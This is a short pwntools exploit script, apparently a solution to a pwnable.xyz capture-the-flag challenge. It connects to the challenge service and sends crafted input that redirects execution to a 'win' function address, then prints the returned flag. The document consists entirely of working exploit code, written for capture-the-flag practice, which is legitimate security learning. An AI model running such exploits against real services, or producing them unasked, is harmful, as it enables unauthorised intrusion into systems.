from pwn import *

win = 0x400822

p = remote('svc.pwnable.xyz', 30002)

p.sendline(str(win) + '0' + '13')

p.sendline('a')

print p.recvuntil('}')